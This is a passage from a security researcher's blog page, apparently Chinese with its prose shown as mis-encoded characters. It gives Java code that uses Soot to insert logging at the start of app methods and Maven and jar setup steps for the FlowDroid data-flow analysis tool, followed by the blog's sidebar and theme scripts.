class="keyword">new</span> <span class="title class_">Transform</span>(<span class="string">&quot;jtp.myLogger&quot;</span>, <span class="keyword">new</span> <span class="title class_">BodyTransformer</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">internalTransform</span><span class="params">(Body b, String phaseName, Map&lt;String, String&gt; options)</span> &#123;</span><br><span class="line">        <span class="comment">// First we filter out Android framework methods</span></span><br><span class="line">        <span class="keyword">if</span>(InstrumentUtil.isAndroidMethod(b.getMethod()))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">JimpleBody</span> <span class="variable">body</span> <span class="operator">=</span> (JimpleBody) b;</span><br><span class="line">        <span class="type">UnitPatchingChain</span> <span class="variable">units</span> <span class="operator">=</span> b.getUnits();</span><br><span class="line">        List&lt;Unit&gt; generatedUnits = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// The message that we want to log</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s Beginning of method %s&quot;</span>, InstrumentUtil.TAG, body.getMethod().getSignature());</span><br><span class="line">        <span class="comment">// In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value</span></span><br><span class="line">        <span class="type">Local</span> <span class="variable">psLocal</span> <span class="operator">=</span> InstrumentUtil.generateNewLocal(body, RefType.v(<span class="string">&quot;java.io.PrintStream&quot;</span>));</span><br><span class="line">        <span class="comment">// Now we assign &quot;System.out&quot; to psLocal</span></span><br><span class="line">        <span class="type">SootField</span> <span class="variable">sysOutField</span> <span class="operator">=</span> Scene.v().getField(<span class="string">&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;</span>);</span><br><span class="line">        <span class="type">AssignStmt</span> <span class="variable">sysOutAssignStmt</span> <span class="operator">=</span> Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef()));</span><br><span class="line">        generatedUnits.add(sysOutAssignStmt);</span><br><span class="line">        <span class="comment">// Create println method call and provide its parameter</span></span><br><span class="line">        <span class="type">SootMethod</span> <span class="variable">printlnMethod</span> <span class="operator">=</span> Scene.v().grabMethod(<span class="string">&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;</span>);</span><br><span class="line">        <span class="type">Value</span> <span class="variable">printlnParamter</span> <span class="operator">=</span> StringConstant.v(content);</span><br><span class="line">        <span class="type">InvokeStmt</span> <span class="variable">printlnMethodCallStmt</span> <span class="operator">=</span> Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter));</span><br><span class="line">        generatedUnits.add(printlnMethodCallStmt);</span><br><span class="line">        <span class="comment">// Insert the generated statement before the first  non-identity stmt</span></span><br><span class="line">        units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt());</span><br><span class="line">        <span class="comment">// Validate the body to ensure that our code injection does not introduce any problem (at least statically)</span></span><br><span class="line">        b.validate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="FlowDroid-PointsTo"><a href="#FlowDroid-PointsTo" class="headerlink" title="FlowDroid + PointsTo"></a>FlowDroid + PointsTo</h3><p><code>FlowDroid</code> æ˜¯ä¸€æ¬¾ç”¨äº <code>Android</code> åº”ç”¨ç¨‹åºå’Œ <code>Java</code> ç¨‹åºçš„æ•°æ®æµåˆ†æåŠŸèƒ½ï¼Œé¡¹ç›®<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid">åœ°å€</a>ã€‚</p>
<p>å¦‚æœæ˜¯ä½¿ç”¨ Mavenï¼Œç¼–è¾‘ <code>pom.xml</code>å³å¯ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-summaries<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.fraunhofer.sit.sse.flowdroid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>soot-infoflow-android<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœåªä½¿ç”¨å‘½ä»¤è¡Œï¼Œåˆ™åœ¨<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>é‡Œä¸‹è½½<code>soot-infoflow-cmd-jar-with-dependencies.jar</code>å³å¯ã€‚</p>
<p>å¦‚æœä¸ä½¿ç”¨<code>pom.xml</code>ï¼Œä½¿ç”¨<code>jar</code>åŒ…çš„æ–¹å¼ï¼Œéœ€è¦å»<a target="_blank" rel="noopener" href="https://github.com/secure-software-engineering/FlowDroid/releases">Relase</a>ä¸‹è½½<code>soot-infoflow-android-classes.jar</code>å’Œ<code>soot-infoflow-classes.jar</code>ï¼Œå†å»Sootçš„<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=HzjYkP/HgkU1xzcZFUAgbQ==.ZT99lh7G5tR1RbjbWKkx7vAVeM5bMFQD///krUVFH6eMiI2TYxlBEYANDSAUtdFnviP1SJ4LWKbgY7RcZgTVjpwh0hB/sixiDALazZB/8Gw=">ä»“åº“</a>ä¸‹è½½åŒ…å«<code>heros</code>ä¸<code>jasmin</code>çš„<code>sootclasses-trunk-jar-with-dependencies.jar</code>ï¼Œå°†ä¸Šè¿°ä¸‰ä¸ªåŒ…åŠ å…¥é¡¹ç›®ä¾èµ–ä¾¿å®Œæˆäº†<code>FlowDroid</code>çš„é…ç½®ã€‚</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/tags/android/page/0/">Previous</a></div><div class="pagination-next"><a href="/tags/android/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/tags/android/">1</a></li><li><a class="pagination-link" href="/tags/android/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://avatars.githubusercontent.com/u/19711495?v=4" alt="buffer0verflooow"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">buffer0verflooow</p><p class="is-size-6 is-block">Security Researcher</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Beijing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">56</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">51</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-10T06:23:56.000Z">2022-10-10</time></p><p class="title"><a href="/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-30T07:29:09.000Z">2022-07-30</time></p><p class="title"><a href="/2022/07/30/Android%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">Androidå®‰å…¨ç¬”è®°</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-20T12:35:56.000Z">2022-07-20</time></p><p class="title"><a href="/2022/07/20/Android%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Androidä¸­é—´äººæ”»å‡»æ–¹æ³•æ•´ç†</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-04T12:34:01.000Z">2022-07-04</time></p><p class="title"><a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">Android 11 é­”å½¢å¥³æ¼æ´</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-01T13:59:36.000Z">2022-07-01</time></p><p class="title"><a href="/2022/07/01/macOS-Intel%E5%9B%BE%E5%BD%A2%E5%86%85%E6%A0%B8%E6%8B%93%E5%B1%95RCE-EOP/">macOS Intelå›¾å½¢å†…æ ¸æ‹“å±•RCE+EOP</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">June 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ASN-1/"><span class="tag">ASN.1</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppleAVE2/"><span class="tag">AppleAVE2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ContentProvider/"><span class="tag">ContentProvider</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOServices/"><span class="tag">IOServices</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/LPE/"><span class="tag">LPE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PendingIntent/"><span class="tag">PendingIntent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adobe/"><span class="tag">adobe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/afl/"><span class="tag">afl++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ams/"><span class="tag">ams</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">18</span></a></div><div class="control"><a class="tags has-addons" href="/tags/aosp/"><span class="tag">aosp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/apple/"><span class="tag">apple</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/arm64/"><span class="tag">arm64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cfprefsd/"><span class="tag">cfprefsd</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/chrome/"><span class="tag">chrome</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/darwin/"><span class="tag">darwin</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/exploit/"><span class="tag">exploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gpu/"><span class="tag">gpu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hook/"><span class="tag">hook</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intel/"><span class="tag">intel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/intent/"><span class="tag">intent</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iomfb/"><span class="tag">iomfb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ios/"><span class="tag">ios</span><span class="tag">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/logic-vul/"><span class="tag">logic vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/lpe/"><span class="tag">lpe</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mach/"><span class="tag">mach</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/macos/"><span class="tag">macos</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mig/"><span class="tag">mig</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/note/"><span class="tag">note</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/npu/"><span class="tag">npu</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pac/"><span class="tag">pac</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pipe/"><span class="tag">pipe</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pongoOS/"><span class="tag">pongoOS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qemu/"><span class="tag">qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcom/"><span class="tag">qualcom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/qualcomm/"><span class="tag">qualcomm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rce/"><span class="tag">rce</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/safari/"><span class="tag">safari</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/samsung/"><span class="tag">samsung</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/soot/"><span class="tag">soot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/static-analysis/"><span class="tag">static analysis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/syzkaller/"><span class="tag">syzkaller</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tcc/"><span class="tag">tcc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/telecom/"><span class="tag">telecom</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/uaf/"><span class="tag">uaf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/webaudio/"><span class="tag">webaudio</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xnu/"><span class="tag">xnu</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xpc/"><span class="tag">xpc</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 buffer0verflooow</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">Â© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>